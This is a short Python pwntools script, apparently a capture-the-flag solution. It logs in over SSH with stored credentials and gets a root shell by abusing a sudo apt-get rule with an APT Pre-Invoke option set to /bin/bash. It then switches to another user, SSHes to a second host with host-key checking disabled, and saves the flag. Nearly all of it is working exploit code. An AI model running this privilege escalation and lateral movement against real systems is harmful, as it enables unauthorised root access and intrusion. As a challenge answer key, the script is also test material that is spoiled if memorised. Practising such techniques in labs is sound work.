import json
import time

from pwnlib.tubes import ssh

with open("metadata.json", "r") as f:
    md = json.loads(f.read())


def buffer_predicate(buff):
    return len(buff) > len(CMD) and buff[-len(CMD) :] == CMD


s = ssh.ssh(host="work", user=md["username"], password=md["password"])
sh = s.shell(tty=True)
sh.recvuntil("$")  # user prompt ready
sh.sendline("sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash")
sh.recvuntil("#")  # root prompt ready
sh.sendline("su - asmith")
sh.recvuntil("$")  # user prompt ready
sh.sendline('ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" home')
sh.recvuntil("$")  # user prompt ready
sh.sendline("cat flag.txt")
sh.recvline()  # Read the rest of our command line
flag = sh.recvlineS().strip()

with open("flag", "w") as f:
    f.write(flag)
